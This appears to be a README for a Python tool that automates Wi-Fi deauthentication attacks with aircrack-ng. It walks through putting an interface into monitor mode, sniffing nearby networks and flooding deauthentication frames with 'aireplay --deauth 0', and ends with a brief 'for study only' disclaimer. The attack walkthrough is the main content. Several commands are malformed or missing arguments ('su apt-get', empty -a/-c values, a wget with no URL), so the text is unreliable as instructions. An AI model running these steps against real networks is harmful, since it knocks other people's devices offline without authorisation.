# Introduction
Wifi deauthentication attack allows attackers to send frames from an access point to a station,even though the attack is not in the network.

Actually, send deauthentication frame is a normal functionality on all routers, almost all routers need to send special frames to inform rogue station to get out of network.

# Requirement
1. aircrack-ng
    ```
    su apt-get install aircrack-ng
    ```
    
2. ifconfig
    ```
    su apt-get install net-tools
    ```

3. iwconfig
    ```
    su sudo apt install wireless-tools
    ```

4. mac_address.csv

    the *mac_address.csv* contains OUIs and corresponds company names. first column is OUI and second column is Company.
    
    format:
    ```
    oui,company
    xx:xx:xx,xxx
    xx:xx:xx:x,xxx
    ```
    
    I downloaded *mac_address.csv* from [https://macaddress.io/database/macaddress.io-db.csv](https://macaddress.io/database/macaddress.io-db.csv), edit the file to only contain *oui* and *company* column,rename the file to *macaddress.csv*. then move the *macaddress.csv* file into the same directory as *deauth.py*.
    

# The Core Concept

This project completely builds on `aircrack-ng` package. below is core steps how to pose a deauthentication attack on the shell.

1. check the wireless interface name

    ```
    iwconfig
    ```

2. put wireless interface into monitor mode

    ```
    airmon-ng start wlan0
    ```

3. check the wireless interface name again

    Normally, the step2 will change the wireless interface's name. in the majority of cases, it will append `mon` on the previous name's end.
    ```
    iwconfig
    ```

4. sniff data on traffics
    ```
    airodump-ng wlan0mon
    ```

5. sniff data on specific network traffic

    ```
    airodump-ng -d -c  wlan0mon
    ```

6. send deauthentication frames

    ```
    aireplay --deauth 0 -a -c wlan0mon
    ```


# How to use deauth.py
1. download deauth

    ```
    su apt-get wget 
    ```
    
2. run it with python3.x

    ```
    python3 deauth.py
    ```

# Disclaimer
Don't use this project to do any illegal things. it's only used for the study. responsibilities arising from the use of this project have nothing to do with the author.


